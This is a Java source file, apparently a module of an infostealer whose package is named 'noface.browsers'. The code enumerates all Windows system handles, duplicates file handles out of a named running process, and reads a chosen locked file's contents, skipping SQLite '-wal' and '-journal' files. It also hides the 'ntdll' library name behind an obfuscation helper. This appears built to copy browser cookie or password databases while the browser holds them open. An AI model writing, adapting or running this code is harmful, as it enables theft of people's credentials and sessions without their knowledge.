package noface.browsers;

import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import noface.browsers.win.K32File;
import noface.config.S;

import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

public final class Dup {

    private static final int SYS_HANDLE_INFO = 0x40;
    private static final int OBJ_NAME_INFO = 1;
    private static final int PROC_DUP = 0x0040;
    private static final int DUP_SAME = 0x00000002;

    public interface Ntdll extends com.sun.jna.Library {
        Ntdll I = Native.load(S.e("ntdll"), Ntdll.class);
        int NtQuerySystemInformation(int cls, Pointer buf, int len, IntByReference ret);
        int NtDuplicateObject(WinNT.HANDLE srcProc, Pointer src, WinNT.HANDLE dstProc, PtrRef dst, int access, int attr, int opts);
        int NtQueryObject(WinNT.HANDLE h, int cls, Pointer info, int len, IntByReference ret);
    }

    public static class PtrRef extends com.sun.jna.ptr.ByReference {
        public PtrRef() { super(Native.POINTER_SIZE); }
        public WinNT.HANDLE val() { return new WinNT.HANDLE(getPointer().getPointer(0)); }
    }

    public static byte[] grab(Path source, String processName) {
        List<Integer> pids = pids(processName);
        if (pids.isEmpty()) return null;

        Memory mem = handles();
        if (mem == null) return null;

        long count = Native.POINTER_SIZE == 8 ? mem.getLong(0) : mem.getInt(0);
        long base = Native.POINTER_SIZE == 8 ? 16 : 8;
        long entry = Native.POINTER_SIZE == 8 ? 40 : 28;
        WinNT.HANDLE self = Kernel32.INSTANCE.GetCurrentProcess();

        for (int pid : pids) {
            WinNT.HANDLE proc = Kernel32.INSTANCE.OpenProcess(PROC_DUP, false, pid);
            if (proc == null) continue;
            try {
                for (long j = 0; j < count; j++) {
                    long off = base + j * entry;
                    long handlePid = Native.POINTER_SIZE == 8 ? mem.getLong(off + 8) : mem.getInt(off + 4);
                    if (handlePid != pid) continue;

                    Pointer handleVal = mem.getPointer(off + (Native.POINTER_SIZE == 8 ? 16 : 8));
                    PtrRef dupRef = new PtrRef();
                    if (Ntdll.I.NtDuplicateObject(proc, handleVal, self, dupRef, 0, 0, DUP_SAME) != 0) continue;

                    WinNT.HANDLE dup = dupRef.val();
                    if (K32File.INSTANCE.GetFileType(dup) != 1) {
                        Kernel32.INSTANCE.CloseHandle(dup);
                        continue;
                    }

                    Memory nameInfo = new Memory(4096);
                    IntByReference nameLen = new IntByReference();
                    ExecutorService ex = Executors.newSingleThreadExecutor(r -> {
                        Thread t = new Thread(r);
                        t.setDaemon(true);
                        return t;
                    });
                    Future<Integer> fut = ex.submit(() -> Ntdll.I.NtQueryObject(dup, OBJ_NAME_INFO, nameInfo, 4096, nameLen));
                    try {
                        if (fut.get(300, TimeUnit.MILLISECONDS) == 0) {
                            int len = nameInfo.getShort(0);
                            Pointer namePtr = nameInfo.getPointer(Native.POINTER_SIZE == 8 ? 8 : 4);
                            if (len > 0 && namePtr != null) {
                                String name = new String(namePtr.getByteArray(0, len), StandardCharsets.UTF_16LE).trim();
                                if (name.endsWith("\\" + source.getFileName()) && !name.contains("-wal") && !name.contains("-journal")) {
                                    byte[] data = read(dup);
                                    Kernel32.INSTANCE.CloseHandle(dup);
                                    ex.shutdownNow();
                                    if (data != null) return data;
                                }
                            }
                        }
                    } catch (Exception ignored) {
                        fut.cancel(true);
                    } finally {
                        ex.shutdownNow();
                    }
                    Kernel32.INSTANCE.CloseHandle(dup);
                }
            } finally {
                Kernel32.INSTANCE.CloseHandle(proc);
            }
        }
        return null;
    }

    private static Memory handles() {
        int size = 8 * 1024 * 1024;
        IntByReference ret = new IntByReference();
        while (size <= 256 * 1024 * 1024) {
            Memory buf = new Memory(size);
            int status = Ntdll.I.NtQuerySystemInformation(SYS_HANDLE_INFO, buf, size, ret);
            if (status == 0xC0000004) { size *= 2; continue; }
            if (status == 0) return buf;
            break;
        }
        return null;
    }

    private static byte[] read(WinNT.HANDLE h) {
        try {
            int size = K32File.INSTANCE.GetFileSize(h, null);
            if (size <= 0 || size > 512 * 1024 * 1024) return null;
            K32File.INSTANCE.SetFilePointer(h, 0, null, 0);
            byte[] data = new byte[size];
            IntByReference n = new IntByReference();
            if (Kernel32.INSTANCE.ReadFile(h, data, size, n, null) && n.getValue() > 0) {
                if (n.getValue() < size) {
                    byte[] out = new byte[n.getValue()];
                    System.arraycopy(data, 0, out, 0, n.getValue());
                    return out;
                }
                return data;
            }
        } catch (Exception ignored) {}
        return null;
    }

    private static List<Integer> pids(String processName) {
        List<Integer> out = new ArrayList<>();
        WinNT.HANDLE snap = Kernel32.INSTANCE.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0));
        if (snap == null) return out;
        Tlhelp32.PROCESSENTRY32 pe = new Tlhelp32.PROCESSENTRY32();
        if (Kernel32.INSTANCE.Process32First(snap, pe)) {
            do {
                String name = Native.toString(pe.szExeFile);
                if (name.equalsIgnoreCase(processName) || name.equalsIgnoreCase(processName + ".exe")) {
                    out.add(pe.th32ProcessID.intValue());
                }
            } while (Kernel32.INSTANCE.Process32Next(snap, pe));
        }
        Kernel32.INSTANCE.CloseHandle(snap);
        return out;
    }

    private Dup() {}
}
